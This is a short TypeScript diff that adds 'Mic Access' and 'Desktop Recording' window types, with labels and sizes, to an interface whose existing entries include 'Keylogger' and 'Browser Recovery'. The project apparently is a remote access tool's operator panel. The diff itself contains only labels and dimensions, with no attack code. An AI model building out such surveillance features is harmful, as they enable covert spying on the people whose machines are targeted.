@@ -42,6 +42,10 @@ const translateWindowType = (type: string) => {
       return "Keylogger";
     case "browser-data":
       return "Browser Recovery";
+    case "mic-access":
+      return "Mic Access";
+    case "desktop-recording":
+      return "Desktop Recording";
     default:
       return type;
   }
@@ -91,6 +95,14 @@ const windowTypeSizes = {
   "browser-data": {
     width: 1200,
     height: 800,
+  },
+  "mic-access": {
+    width: 900,
+    height: 600,
+  },
+  "desktop-recording": {
+    width: 1100,
+    height: 700,
   },
 };
 
